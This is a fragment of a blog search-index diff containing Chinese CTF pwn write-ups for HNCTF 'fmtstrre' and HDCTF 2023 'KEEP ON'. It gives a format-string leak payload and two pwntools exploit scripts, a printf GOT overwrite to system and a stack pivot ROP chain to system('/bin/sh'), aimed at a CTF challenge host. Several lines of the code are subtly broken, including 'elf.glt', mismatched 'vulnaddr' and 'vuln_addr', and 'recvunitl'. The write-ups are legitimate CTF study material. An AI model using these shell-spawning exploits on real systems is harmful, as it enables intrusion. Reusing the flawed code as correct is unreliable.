+<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;03.png)</p>
+<blockquote>
+<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
+<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
+<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
+</blockquote>
+<p>32 + 6 &#x3D;38</p>
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-[HDCTF 2023]KEEP ON的Wp</title>
+    <url>/CTF/Pwn/hdctf%E7%9A%84wp/</url>
+    <content><![CDATA[<p><strong>知识点：格式化字符串劫持、<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移</a></strong></p>
+<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/05.png"></p>
+<p><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>寻找偏移量 找 616161在第几位 </p>
+<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
+</blockquote>
+<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/01.png"></p>
+<p><strong>法2,栈迁移,可以先阅读前面的那个文章</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Q&amp;A（个人理解）</p>
+<p><code>%16$p是哪来的</code></p>
+<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
+<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/02.png"></p>
+<p><code>0x60是哪里来的?</code></p>
+<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
+<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/03.png"></p>
+<p><code>payload中为什么要加0x20 ?</code></p>
+<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
+<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/04.png"></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
   </entry>
 </search>
